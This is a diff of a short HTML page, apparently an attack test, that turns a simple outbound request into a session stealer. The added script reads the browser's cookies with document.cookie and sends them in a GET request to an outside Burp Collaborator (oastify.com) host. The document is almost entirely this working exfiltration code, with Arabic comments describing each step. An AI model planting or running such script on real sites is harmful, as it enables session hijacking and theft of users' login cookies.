@@ -1,13 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test</title>
+    <title>Session Stealer Test</title>
 </head>
 <body>
+    <h1>Session Stealer Test</h1>
+    <!-- صورة للتفاعل مع الصفحة -->
+    <img src="https://example.com/your-image.jpg" alt="Image" />
+
     <script type="text/javascript">
-        // إرسال طلب GET بسيط إلى Burp Collaborator
+        // جمع الكوكيز من المتصفح
+        var cookies = document.cookie;
+
+        // إرسال الكوكيز إلى Burp Collaborator
         var xhr = new XMLHttpRequest();
-        var url = "http://nripww5hmcqibsmkz7yhb8hl5cbcz5nu.oastify.com/test";
+        var url = "https://mf5okvtgabehzrajn6mgz75ktbzbn6bv.oastify.com?cookie=" + encodeURIComponent(cookies);
         xhr.open("GET", url, true);
         xhr.send();
     </script>
